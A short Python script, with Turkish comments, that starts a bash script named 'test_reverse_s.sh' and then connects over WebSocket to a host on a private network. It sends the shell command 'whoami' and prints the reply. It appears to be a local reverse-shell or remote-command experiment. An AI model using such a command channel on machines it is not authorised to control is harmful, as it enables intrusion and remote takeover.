import asyncio
import websockets
import subprocess

# subprocess.Popen kullanarak arka planda bir bash script çalıştırılır
subprocess.Popen(["qterminal", "-e", "bash", "-c", "./test_reverse_s.sh"])

async def send_command():
    uri = "ws://192.168.1.3:8765"  # SERVER_IP yerine sunucunun IP adresini yazın
    async with websockets.connect(uri) as websocket:
        # Komut listesi
        commands = ["whoami"]
        for command in commands:
            await websocket.send(command)
            print("Komut gönderildi, yanıt bekleniyor...")
            output = await websocket.recv()
            print("Sunucudan gelen yanıt:")
            print(output)

if __name__ == "__main__":
    asyncio.run(send_command())
